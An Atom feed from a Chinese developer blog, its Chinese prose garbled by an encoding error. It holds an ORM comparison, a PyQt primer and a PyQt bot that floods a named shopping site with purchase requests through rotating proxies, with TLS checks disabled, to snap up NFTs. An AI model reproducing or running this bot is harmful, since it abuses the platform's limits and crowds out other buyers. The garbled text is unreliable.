<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><title type="text">ifish</title><subtitle type="html">æ„¿å­¦æœ‰æ‰€æˆï¼Œé—®æœ‰æ‰€å¾—ï¼Œé™æœ‰æ‰€æ€ï¼Œè€Œç§æœ‰æ‰€æƒ˜</subtitle><updated>2023-01-01T18:53:10+08:00</updated><id>https://if1sh.com/</id><link rel="alternate" type="text/html" href="https://if1sh.com/"/><link rel="self" type="application/atom+xml" href="https://if1sh.com/atom.xml"/><author><name>ifish</name><uri>https://if1sh.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><generator uri="https://gohugo.io/" version="0.108.0">Hugo</generator><entry><title type="text">tortoiseå’Œsqlalchemyå†™æ³•å¯¹æ¯”</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/tortoise%E5%92%8Csqlalchemy%E5%86%99%E6%B3%95%E5%AF%B9%E6%AF%94/"/><id>https://if1sh.com/posts/tortoise%E5%92%8Csqlalchemy%E5%86%99%E6%B3%95%E5%AF%B9%E6%AF%94/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2023-01-01T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">tortoiseå’Œsqlalchemyå†™æ³•å¯¹æ¯” åˆæ­¥å¯¹æ¯”äº†å¢åˆ æ”¹æŸ¥ï¼Œsqlalchemâ€¦â€¦</summary><content type="html">&lt;h1 id="tortoiseå’Œsqlalchemyå†™æ³•å¯¹æ¯”">tortoiseå’Œsqlalchemyå†™æ³•å¯¹æ¯”&lt;/h1>
&lt;p>åˆæ­¥å¯¹æ¯”äº†å¢åˆ æ”¹æŸ¥ï¼Œsqlalchemyå¯ä»¥æ”¹ä¸ºåŠè‡ªåŠ¨commit&lt;/p>
&lt;pre tabindex="0">&lt;code>from fastapi import APIRouter
from fastapi.encoders import jsonable_encoder
from sqlalchemy import select, update, delete
from common.schemas import R
from common.utils import list2tree
from db.midd import db
from models.menu import Menu
from models.sys_menu import SysMenu
from schemas.menu import MenuInfo, MenuSchema, MenuTree
router = APIRouter(prefix=&amp;#34;/menu&amp;#34;, tags=[&amp;#34;èœå•ç®¡ç†&amp;#34;])
@router.get(&amp;#34;&amp;#34;, summary=&amp;#34;èœå•ğŸŒ²&amp;#34;, response_model=R[MenuTree])
async def query_menu():
&amp;#34;&amp;#34;&amp;#34;
èœå•åˆ—è¡¨-tree
:return:
&amp;#34;&amp;#34;&amp;#34;
# data1 = await Menu.all().values()
# print(data1)
# print(db.session.execute(select(SysMenu)).scalars().all())
# print(db.session.execute(select(SysMenu)).all())
data = db.session.execute(select(SysMenu)).scalars().all()
# tupleè½¬ä¸ºdict
data = jsonable_encoder(data)
return R.success(data=list2tree(data))
@router.post(&amp;#34;&amp;#34;, summary=&amp;#34;åˆ›å»ºèœå•&amp;#34;, response_model=R[MenuInfo])
async def add_menu(menu_schema: MenuSchema):
&amp;#34;&amp;#34;&amp;#34;
æ–°å¢èœå•
:param menu_schema:
:return:
&amp;#34;&amp;#34;&amp;#34;
# obj = await Menu.create(**menu_schema.dict())
obj = SysMenu(**menu_schema.dict())
db.session.add(obj)
db.session.commit()
print(obj)
return R.success(data=obj)
@router.put(&amp;#34;/{id}&amp;#34;, summary=&amp;#34;æ›´æ–°èœå•&amp;#34;, response_model=R[MenuInfo])
async def edit_menu(id: int, menu_schema: MenuSchema):
&amp;#34;&amp;#34;&amp;#34;
æ›´æ–°èœå•
:param id:
:param menu_schema:
:return:
&amp;#34;&amp;#34;&amp;#34;
# await Menu.filter(id=id).update(**menu_schema.dict())
# data = await Menu.get_or_none(id=id)
stmt = update(SysMenu).filter(SysMenu.id == id).values(**menu_schema.dict())
db.session.execute(stmt)
db.session.commit()
data = db.session.execute(select(SysMenu).filter(SysMenu.id == id)).scalar()
print(data)
return R.success(data=data)
@router.delete(&amp;#34;/{id}&amp;#34;, summary=&amp;#34;åˆ é™¤èœå•&amp;#34;, response_model=R)
async def del_menu(id: int):
&amp;#34;&amp;#34;&amp;#34;
åˆ é™¤èœå•
:param id:
:return:
é€»è¾‘åˆ é™¤ ä¿®æ”¹çŠ¶æ€
&amp;#34;&amp;#34;&amp;#34;
# ä¼ªåˆ é™¤
# await Menu.filter(id=id).update(status=9)
stmt = update(SysMenu).filter(SysMenu.id == id).values(status=9)
db.session.execute(stmt)
db.session.commit()
# åˆ é™¤
# stmt = delete(SysMenu).filter(SysMenu.id == id).filter()
# db.session.execute(stmt)
# db.session.commit()
return R.success()
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E5%BC%80%E5%8F%91/" term="å¼€å‘" label="å¼€å‘"/><category scheme="https://if1sh.com/tags/tortoise/" term="tortoise" label="tortoise"/><category scheme="https://if1sh.com/tags/sqlalchemy/" term="sqlalchemy" label="sqlalchemy"/></entry><entry><title type="text">pyqtæŠ¢è´­nft</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/pyqt%E6%8A%A2%E8%B4%ADnft/"/><id>https://if1sh.com/posts/pyqt%E6%8A%A2%E8%B4%ADnft/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-06-19T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">pyqtæŠ¢è´­nft core # -*- coding: utf-8 -*- import multiprocessing import sys import time from PyQt5.QtCore import QThread, pyqtSignal from PyQt5.QtWidgets import QApplication, QMainWindow from qiankunui import Ui_MainWindow import requests import cgitb from datetime importâ€¦â€¦</summary><content type="html">&lt;h1 id="pyqtæŠ¢è´­nft">pyqtæŠ¢è´­nft&lt;/h1>
&lt;p>core&lt;/p>
&lt;pre tabindex="0">&lt;code>
# -*- coding: utf-8 -*-
import multiprocessing
import sys
import time
from PyQt5.QtCore import QThread, pyqtSignal
from PyQt5.QtWidgets import QApplication, QMainWindow
from qiankunui import Ui_MainWindow
import requests
import cgitb
from datetime import datetime
from apscheduler.schedulers.blocking import BlockingScheduler
from apscheduler.schedulers.qt import QtScheduler
from itertools import cycle
from requests.packages import urllib3
urllib3.disable_warnings()
cgitb.enable(format=&amp;#39;text&amp;#39;)
class MyMainForm(QMainWindow, Ui_MainWindow):
def __init__(self, parent=None):
super(MyMainForm, self).__init__(parent)
self.setupUi(self)
# 2.æ‰‹åŠ¨å¤šçº¿ç¨‹å‘åŒ…
self.work = WorkThread(self)
self.start.clicked.connect(self.execute)
self.stop.clicked.connect(self.stoping)
# 1.ç™»å½•
self.ui_login = Login(self)
self.login.clicked.connect(self.start_login)
# 3.auto
self.auto_buy.clicked.connect(self.auto_buy1)
def auto_buy1(self):
self.work.auto_buy()
self.work.trigger.connect(self.display)
def start_login(self):
self.ui_login.start()
self.ui_login.trigger.connect(self.display)
def stoping(self):
self.work.stop()
self.work.trigger.connect(self.display)
def execute(self):
# å¯åŠ¨çº¿ç¨‹
self.work.start()
# çº¿ç¨‹è‡ªå®šä¹‰ä¿¡å·è¿æ¥çš„æ§½å‡½æ•°
self.work.trigger.connect(self.display)
def display(self, str):
# ç”±äºè‡ªå®šä¹‰ä¿¡å·æ—¶è‡ªåŠ¨ä¼ é€’ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªæ§½å‡½æ•°ä¸­è¦æ¥å—ä¸€ä¸ªå‚æ•°
self.listWidget.addItem(str)
class Login(QThread):
trigger = pyqtSignal(str)
def __init__(self, demo):
super(Login, self).__init__()
self.demo = demo
def run(self):
username = self.demo.username.text().strip()
password = self.demo.password.text().strip()
try:
burp0_url = &amp;#34;https://x.com&amp;#34;
burp0_headers = {&amp;#34;Sec-Ch-Ua&amp;#34;: &amp;#34;\&amp;#34;(Not(A:Brand\&amp;#34;;v=\&amp;#34;8\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;101\&amp;#34;&amp;#34;, &amp;#34;Sid&amp;#34;: &amp;#34;35001800000&amp;#34;,
&amp;#34;Sec-Ch-Ua-Mobile&amp;#34;: &amp;#34;?0&amp;#34;,
&amp;#34;User-Agent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36&amp;#34;,
&amp;#34;Content-Type&amp;#34;: &amp;#34;application/x-www-form-urlencoded&amp;#34;, &amp;#34;Newversion&amp;#34;: &amp;#34;H5_1.0&amp;#34;,
&amp;#34;Sec-Ch-Ua-Platform&amp;#34;: &amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;, &amp;#34;Source&amp;#34;: &amp;#34;218&amp;#34;, &amp;#34;Accept&amp;#34;: &amp;#34;*/*&amp;#34;,
&amp;#34;Origin&amp;#34;: &amp;#34;http://nt.fengkuangtiyu.cn&amp;#34;, &amp;#34;Sec-Fetch-Site&amp;#34;: &amp;#34;cross-site&amp;#34;,
&amp;#34;Sec-Fetch-Mode&amp;#34;: &amp;#34;cors&amp;#34;, &amp;#34;Sec-Fetch-Dest&amp;#34;: &amp;#34;empty&amp;#34;,
&amp;#34;Referer&amp;#34;: &amp;#34;http://nt.fengkuangtiyu.cn/&amp;#34;,
&amp;#34;Accept-Encoding&amp;#34;: &amp;#34;gzip, deflate&amp;#34;, &amp;#34;Accept-Language&amp;#34;: &amp;#34;zh-CN,zh;q=0.9&amp;#34;,
&amp;#34;Connection&amp;#34;: &amp;#34;close&amp;#34;}
burp0_data = {&amp;#34;phone&amp;#34;: f&amp;#34;{username}&amp;#34;, &amp;#34;loginPwd&amp;#34;: f&amp;#34;{password}&amp;#34;}
res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
except Exception as e:
print(e)
res_json = res.json()
print(res_json[&amp;#34;data&amp;#34;][&amp;#34;loginSign&amp;#34;])
self.trigger.emit(res.text)
self.demo.token.setText(res_json[&amp;#34;data&amp;#34;][&amp;#34;loginSign&amp;#34;])
self.demo.userid.setText(res_json[&amp;#34;data&amp;#34;][&amp;#34;userId&amp;#34;])
class WorkThread(QThread):
# è‡ªå®šä¹‰ä¿¡å·å¯¹è±¡ã€‚å‚æ•°strå°±ä»£è¡¨è¿™ä¸ªä¿¡å·å¯ä»¥ä¼ ä¸€ä¸ªå­—ç¬¦ä¸²
trigger = pyqtSignal(str)
def __init__(self, demo): # 3
super(WorkThread, self).__init__()
self.demo = demo
self.pool = None
def callback(self, x):
self.trigger.emit(x)
# ä¸»è¦å¯åŠ¨å‡½æ•°
def run(self):
# é‡å†™çº¿ç¨‹æ‰§è¡Œçš„runå‡½æ•°
# è§¦å‘è‡ªå®šä¹‰ä¿¡å·
userid = self.demo.userid.text().strip()
token = self.demo.token.text().strip()
goodsid = self.demo.goodsid.text().strip()
issueid = self.demo.issueid.text().strip()
_proxy = self.demo.proxy_pool.text().strip()
try:
res = requests.get(_proxy)
self.ips = res.text.splitlines()
except Exception as e:
print(e)
self.pool = multiprocessing.Pool()
for ip in cycle(self.ips):
self.pool.apply_async(self.work, (userid, token, goodsid, issueid, ip), error_callback=self.callback,
callback=self.callback)
self.pool.close()
self.pool.join()
@staticmethod
def work(userid, token, goodsid, issueid, ip=None):
proxies = {&amp;#34;http&amp;#34;: ip, &amp;#34;https&amp;#34;: ip}
burp0_url = &amp;#34;https://x&amp;#34;
burp0_headers = {&amp;#34;Sec-Ch-Ua&amp;#34;: &amp;#34;\&amp;#34;(Not(A:Brand\&amp;#34;;v=\&amp;#34;8\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;101\&amp;#34;&amp;#34;, &amp;#34;Sid&amp;#34;: &amp;#34;35001800000&amp;#34;,
&amp;#34;Sec-Ch-Ua-Mobile&amp;#34;: &amp;#34;?0&amp;#34;,
&amp;#34;User-Agent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36&amp;#34;,
&amp;#34;Content-Type&amp;#34;: &amp;#34;application/x-www-form-urlencoded&amp;#34;, &amp;#34;Newversion&amp;#34;: &amp;#34;H5_1.0&amp;#34;,
&amp;#34;Loginsign&amp;#34;: f&amp;#34;{token}&amp;#34;, &amp;#34;Sec-Ch-Ua-Platform&amp;#34;: &amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;,
&amp;#34;Source&amp;#34;: &amp;#34;218&amp;#34;, &amp;#34;Accept&amp;#34;: &amp;#34;*/*&amp;#34;, &amp;#34;Origin&amp;#34;: &amp;#34;http://nt.fengkuangtiyu.cn&amp;#34;,
&amp;#34;Sec-Fetch-Site&amp;#34;: &amp;#34;cross-site&amp;#34;, &amp;#34;Sec-Fetch-Mode&amp;#34;: &amp;#34;cors&amp;#34;, &amp;#34;Sec-Fetch-Dest&amp;#34;: &amp;#34;empty&amp;#34;,
&amp;#34;Referer&amp;#34;: &amp;#34;http://nt.fengkuangtiyu.cn/&amp;#34;, &amp;#34;Accept-Encoding&amp;#34;: &amp;#34;gzip, deflate&amp;#34;,
&amp;#34;Accept-Language&amp;#34;: &amp;#34;zh-CN,zh;q=0.9&amp;#34;, &amp;#34;Connection&amp;#34;: &amp;#34;close&amp;#34;}
burp0_data = {&amp;#34;userId&amp;#34;: f&amp;#34;{userid}&amp;#34;, &amp;#34;goodsId&amp;#34;: f&amp;#34;{goodsid}&amp;#34;, &amp;#34;issueId&amp;#34;: f&amp;#34;{issueid}&amp;#34;}
try:
res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxies)
except:
pass
time.sleep(0.1)
# é€šè¿‡è‡ªå®šä¹‰ä¿¡å·æŠŠå¾…æ˜¾ç¤ºçš„å­—ç¬¦ä¸²ä¼ é€’ç»™æ§½å‡½æ•°
print(res.text)
return res.text
# åœæ­¢
def stop(self):
print(&amp;#39;stop&amp;#39;)
self.pool.terminate()
self.is_running = False
self.terminate()
self.trigger.emit(&amp;#34;stop&amp;#34;)
# å®šæ—¶æŠ¢è´­
def auto_buy(self):
ss = self.demo.ss.text().strip()
y = self.demo.year.text().strip()
mon = self.demo.mon.text().strip()
days = self.demo.days.text().strip()
hours = self.demo.hours.text().strip()
mins = self.demo.mins.text().strip()
scheduler = QtScheduler()
scheduler.add_job(self.run, &amp;#39;date&amp;#39;,
run_date=datetime(int(y), int(mon), int(days), int(hours), int(mins), int(ss)),
)
scheduler.start()
if __name__ == &amp;#34;__main__&amp;#34;:
app = QApplication(sys.argv)
myWin = MyMainForm()
myWin.show()
sys.exit(app.exec_())
&lt;/code>&lt;/pre>&lt;p>ui&lt;/p>
&lt;pre tabindex="0">&lt;code># -*- coding: utf-8 -*-
from PyQt5 import QtCore, QtGui, QtWidgets
class Ui_MainWindow(object):
def setupUi(self, MainWindow):
MainWindow.setObjectName(&amp;#34;MainWindow&amp;#34;)
MainWindow.resize(754, 415)
self.centralwidget = QtWidgets.QWidget(MainWindow)
self.centralwidget.setObjectName(&amp;#34;centralwidget&amp;#34;)
self.listWidget = QtWidgets.QListWidget(self.centralwidget)
self.listWidget.setGeometry(QtCore.QRect(340, 10, 371, 311))
self.listWidget.setObjectName(&amp;#34;listWidget&amp;#34;)
self.code = QtWidgets.QPushButton(self.centralwidget)
self.code.setGeometry(QtCore.QRect(250, 70, 75, 23))
self.code.setObjectName(&amp;#34;code&amp;#34;)
self.label = QtWidgets.QLabel(self.centralwidget)
self.label.setGeometry(QtCore.QRect(50, 70, 54, 20))
self.label.setObjectName(&amp;#34;label&amp;#34;)
self.label_2 = QtWidgets.QLabel(self.centralwidget)
self.label_2.setGeometry(QtCore.QRect(20, 100, 71, 20))
self.label_2.setObjectName(&amp;#34;label_2&amp;#34;)
self.username = QtWidgets.QLineEdit(self.centralwidget)
self.username.setGeometry(QtCore.QRect(100, 70, 113, 20))
self.username.setObjectName(&amp;#34;username&amp;#34;)
self.password = QtWidgets.QLineEdit(self.centralwidget)
self.password.setGeometry(QtCore.QRect(100, 100, 113, 20))
self.password.setObjectName(&amp;#34;password&amp;#34;)
self.login = QtWidgets.QPushButton(self.centralwidget)
self.login.setGeometry(QtCore.QRect(250, 100, 75, 23))
self.login.setObjectName(&amp;#34;login&amp;#34;)
self.start = QtWidgets.QPushButton(self.centralwidget)
self.start.setGeometry(QtCore.QRect(550, 340, 75, 23))
self.start.setObjectName(&amp;#34;start&amp;#34;)
self.stop = QtWidgets.QPushButton(self.centralwidget)
self.stop.setGeometry(QtCore.QRect(640, 340, 75, 23))
self.stop.setObjectName(&amp;#34;stop&amp;#34;)
self.label_3 = QtWidgets.QLabel(self.centralwidget)
self.label_3.setGeometry(QtCore.QRect(20, 130, 71, 20))
self.label_3.setObjectName(&amp;#34;label_3&amp;#34;)
self.token = QtWidgets.QLineEdit(self.centralwidget)
self.token.setGeometry(QtCore.QRect(100, 130, 113, 20))
self.token.setObjectName(&amp;#34;token&amp;#34;)
self.userid = QtWidgets.QLineEdit(self.centralwidget)
self.userid.setGeometry(QtCore.QRect(100, 170, 113, 20))
self.userid.setObjectName(&amp;#34;userid&amp;#34;)
self.issueid = QtWidgets.QLineEdit(self.centralwidget)
self.issueid.setGeometry(QtCore.QRect(100, 210, 113, 20))
self.issueid.setObjectName(&amp;#34;issueid&amp;#34;)
self.label_4 = QtWidgets.QLabel(self.centralwidget)
self.label_4.setGeometry(QtCore.QRect(20, 170, 71, 20))
self.label_4.setObjectName(&amp;#34;label_4&amp;#34;)
self.label_5 = QtWidgets.QLabel(self.centralwidget)
self.label_5.setGeometry(QtCore.QRect(20, 210, 71, 20))
self.label_5.setObjectName(&amp;#34;label_5&amp;#34;)
self.label_6 = QtWidgets.QLabel(self.centralwidget)
self.label_6.setGeometry(QtCore.QRect(20, 240, 71, 20))
self.label_6.setObjectName(&amp;#34;label_6&amp;#34;)
self.goodsid = QtWidgets.QLineEdit(self.centralwidget)
self.goodsid.setGeometry(QtCore.QRect(100, 240, 113, 20))
self.goodsid.setObjectName(&amp;#34;goodsid&amp;#34;)
self.label_7 = QtWidgets.QLabel(self.centralwidget)
self.label_7.setGeometry(QtCore.QRect(20, 270, 71, 20))
self.label_7.setObjectName(&amp;#34;label_7&amp;#34;)
self.proxy_pool = QtWidgets.QLineEdit(self.centralwidget)
self.proxy_pool.setGeometry(QtCore.QRect(100, 270, 113, 20))
self.proxy_pool.setObjectName(&amp;#34;proxy_pool&amp;#34;)
self.year = QtWidgets.QLineEdit(self.centralwidget)
self.year.setGeometry(QtCore.QRect(40, 340, 31, 21))
self.year.setText(&amp;#34;&amp;#34;)
self.year.setObjectName(&amp;#34;year&amp;#34;)
self.label_8 = QtWidgets.QLabel(self.centralwidget)
self.label_8.setGeometry(QtCore.QRect(20, 340, 21, 21))
self.label_8.setObjectName(&amp;#34;label_8&amp;#34;)
self.mon = QtWidgets.QLineEdit(self.centralwidget)
self.mon.setGeometry(QtCore.QRect(100, 340, 31, 21))
self.mon.setText(&amp;#34;&amp;#34;)
self.mon.setObjectName(&amp;#34;mon&amp;#34;)
self.label_9 = QtWidgets.QLabel(self.centralwidget)
self.label_9.setGeometry(QtCore.QRect(80, 340, 21, 21))
self.label_9.setObjectName(&amp;#34;label_9&amp;#34;)
self.days = QtWidgets.QLineEdit(self.centralwidget)
self.days.setGeometry(QtCore.QRect(160, 340, 31, 21))
self.days.setText(&amp;#34;&amp;#34;)
self.days.setObjectName(&amp;#34;days&amp;#34;)
self.label_10 = QtWidgets.QLabel(self.centralwidget)
self.label_10.setGeometry(QtCore.QRect(140, 340, 21, 21))
self.label_10.setObjectName(&amp;#34;label_10&amp;#34;)
self.hours = QtWidgets.QLineEdit(self.centralwidget)
self.hours.setGeometry(QtCore.QRect(220, 340, 31, 21))
self.hours.setText(&amp;#34;&amp;#34;)
self.hours.setObjectName(&amp;#34;hours&amp;#34;)
self.label_11 = QtWidgets.QLabel(self.centralwidget)
self.label_11.setGeometry(QtCore.QRect(200, 340, 21, 21))
self.label_11.setObjectName(&amp;#34;label_11&amp;#34;)
self.mins = QtWidgets.QLineEdit(self.centralwidget)
self.mins.setGeometry(QtCore.QRect(280, 340, 31, 21))
self.mins.setText(&amp;#34;&amp;#34;)
self.mins.setObjectName(&amp;#34;mins&amp;#34;)
self.label_12 = QtWidgets.QLabel(self.centralwidget)
self.label_12.setGeometry(QtCore.QRect(260, 340, 21, 21))
self.label_12.setObjectName(&amp;#34;label_12&amp;#34;)
self.ss = QtWidgets.QLineEdit(self.centralwidget)
self.ss.setGeometry(QtCore.QRect(340, 340, 31, 21))
self.ss.setText(&amp;#34;&amp;#34;)
self.ss.setObjectName(&amp;#34;ss&amp;#34;)
self.label_13 = QtWidgets.QLabel(self.centralwidget)
self.label_13.setGeometry(QtCore.QRect(320, 340, 21, 21))
self.label_13.setObjectName(&amp;#34;label_13&amp;#34;)
self.auto_buy = QtWidgets.QPushButton(self.centralwidget)
self.auto_buy.setGeometry(QtCore.QRect(390, 340, 75, 23))
self.auto_buy.setObjectName(&amp;#34;auto_buy&amp;#34;)
MainWindow.setCentralWidget(self.centralwidget)
self.menubar = QtWidgets.QMenuBar(MainWindow)
self.menubar.setGeometry(QtCore.QRect(0, 0, 754, 23))
self.menubar.setObjectName(&amp;#34;menubar&amp;#34;)
MainWindow.setMenuBar(self.menubar)
self.statusbar = QtWidgets.QStatusBar(MainWindow)
self.statusbar.setObjectName(&amp;#34;statusbar&amp;#34;)
MainWindow.setStatusBar(self.statusbar)
self.retranslateUi(MainWindow)
QtCore.QMetaObject.connectSlotsByName(MainWindow)
def retranslateUi(self, MainWindow):
_translate = QtCore.QCoreApplication.translate
MainWindow.setWindowTitle(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;MainWindow&amp;#34;))
self.code.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;å‘é€éªŒè¯ç &amp;#34;))
self.label.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;è´¦å·&amp;#34;))
self.label_2.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;å¯†ç |éªŒè¯ç &amp;#34;))
self.username.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;&amp;#34;))
self.password.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;&amp;#34;))
self.login.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;ç™»å½•&amp;#34;))
self.start.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;æ‰‹åŠ¨&amp;#34;))
self.stop.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;åœæ­¢&amp;#34;))
self.label_3.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;token&amp;#34;))
self.label_4.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;userid&amp;#34;))
self.label_5.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;issueid&amp;#34;))
self.label_6.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;goodsid&amp;#34;))
self.label_7.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;proxy_pool&amp;#34;))
self.label_8.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;å¹´&amp;#34;))
self.label_9.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;æœˆ&amp;#34;))
self.label_10.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;æ—¥&amp;#34;))
self.label_11.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;æ—¶&amp;#34;))
self.label_12.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;åˆ†&amp;#34;))
self.label_13.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;ç§’&amp;#34;))
self.auto_buy.setText(_translate(&amp;#34;MainWindow&amp;#34;, &amp;#34;å®šæ—¶æŠ¢è´­&amp;#34;))
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/tags/gui/" term="gui" label="gui"/></entry><entry><title type="text">pyqt</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/pyqt%E6%9E%81%E9%80%9F%E5%85%A5%E9%97%A8/"/><id>https://if1sh.com/posts/pyqt%E6%9E%81%E9%80%9F%E5%85%A5%E9%97%A8/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-04-04T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">pyqtæé€Ÿå…¥é—¨ å®‰è£… å®‰è£…pyqt pip install pyqt5 å®‰è£…ç®€åŒ–ç‰ˆqt designer https://build-system.fman.io/qt-designer-download qt designer å…ˆç”¨qt designerâ€¦â€¦</summary><content type="html">&lt;h1 id="pyqtæé€Ÿå…¥é—¨">pyqtæé€Ÿå…¥é—¨&lt;/h1>
&lt;h2 id="å®‰è£…">å®‰è£…&lt;/h2>
&lt;pre tabindex="0">&lt;code>å®‰è£…pyqt
pip install pyqt5
å®‰è£…ç®€åŒ–ç‰ˆqt designer
https://build-system.fman.io/qt-designer-download
&lt;/code>&lt;/pre>&lt;h2 id="qt-designer">qt designer&lt;/h2>
&lt;p>å…ˆç”¨qt designerç”»æ¡†&lt;/p>
&lt;p>ç„¶åå°†uiè½¬ä¸ºpyä»£ç &lt;/p>
&lt;pre tabindex="0">&lt;code>pyuic5 -o destination.py original.ui
&lt;/code>&lt;/pre>&lt;p>ui demo&lt;/p>
&lt;pre tabindex="0">&lt;code># -*- coding: utf-8 -*-
# Form implementation generated from reading ui file &amp;#39;C:\Users\david\Desktop\untitled.ui&amp;#39;
#
# Created by: PyQt5 UI code generator 5.15.4
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again. Do not edit this file unless you know what you are doing.
from PyQt5 import QtCore, QtGui, QtWidgets
class Ui_Form(object):
def setupUi(self, Form):
Form.setObjectName(&amp;#34;Form&amp;#34;)
Form.resize(808, 508)
self.textBrowser = QtWidgets.QTextBrowser(Form)
self.textBrowser.setGeometry(QtCore.QRect(10, 230, 781, 291))
self.textBrowser.setObjectName(&amp;#34;textBrowser&amp;#34;)
self.groupBox = QtWidgets.QGroupBox(Form)
self.groupBox.setGeometry(QtCore.QRect(10, 20, 781, 181))
self.groupBox.setTitle(&amp;#34;&amp;#34;)
self.groupBox.setObjectName(&amp;#34;groupBox&amp;#34;)
self.label = QtWidgets.QLabel(self.groupBox)
self.label.setGeometry(QtCore.QRect(10, 30, 54, 12))
self.label.setObjectName(&amp;#34;label&amp;#34;)
self.pushButton = QtWidgets.QPushButton(self.groupBox)
self.pushButton.setGeometry(QtCore.QRect(454, 22, 71, 31))
self.pushButton.setObjectName(&amp;#34;pushButton&amp;#34;)
self.lineEdit = QtWidgets.QLineEdit(self.groupBox)
self.lineEdit.setGeometry(QtCore.QRect(90, 20, 291, 31))
self.lineEdit.setObjectName(&amp;#34;lineEdit&amp;#34;)
self.pushButton_2 = QtWidgets.QPushButton(self.groupBox)
self.pushButton_2.setGeometry(QtCore.QRect(540, 20, 81, 31))
self.pushButton_2.setObjectName(&amp;#34;pushButton_2&amp;#34;)
self.label_2 = QtWidgets.QLabel(Form)
self.label_2.setGeometry(QtCore.QRect(10, 210, 54, 12))
self.label_2.setObjectName(&amp;#34;label_2&amp;#34;)
self.retranslateUi(Form)
QtCore.QMetaObject.connectSlotsByName(Form)
def retranslateUi(self, Form):
_translate = QtCore.QCoreApplication.translate
Form.setWindowTitle(_translate(&amp;#34;Form&amp;#34;, &amp;#34;script boy tools&amp;#34;))
self.label.setText(_translate(&amp;#34;Form&amp;#34;, &amp;#34;url&amp;#34;))
self.pushButton.setText(_translate(&amp;#34;Form&amp;#34;, &amp;#34;attack&amp;#34;))
self.pushButton_2.setText(_translate(&amp;#34;Form&amp;#34;, &amp;#34;stop&amp;#34;))
self.label_2.setText(_translate(&amp;#34;Form&amp;#34;, &amp;#34;log&amp;#34;))
&lt;/code>&lt;/pre>&lt;p>å°†designer.pyå’Œç¼–å†™é€»è¾‘çš„pyæ”¾åœ¨åŒä¸€ç›®å½•ï¼Œä»¥ä¾¿å¼•ç”¨&lt;/p>
&lt;p>test.py&lt;/p>
&lt;pre tabindex="0">&lt;code>import sys
from PyQt5.QtWidgets import QApplication, QWidget
from designer import Ui_Form
class Demo(QWidget, Ui_Form):
def __init__(self):
super(Demo, self).__init__()
self.setupUi(self) # 1
self.text_edit.textChanged.connect(self.show_text_func) # 2
def show_text_func(self):
self.text_browser.setText(self.text_edit.toPlainText())
if __name__ == &amp;#39;__main__&amp;#39;:
app = QApplication(sys.argv)
demo = Demo()
demo.show()
sys.exit(app.exec_())
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>
&lt;p>å°†UIç•Œé¢å¸ƒå±€åˆ°Demoä¸Šï¼›&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å°†self.text_editçš„textChangedä¿¡å·è¿æ¥åˆ°è‡ªå®šä¹‰çš„æ§½å‡½æ•°ä¸Šï¼Œåœ¨æ§½å‡½æ•°ä¸­æˆ‘ä»¬å°†self.text_browserçš„æ–‡æœ¬è®¾ä¸ºself.text_editçš„æ–‡æœ¬ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="signalå’Œslot">signalå’Œslot&lt;/h2>
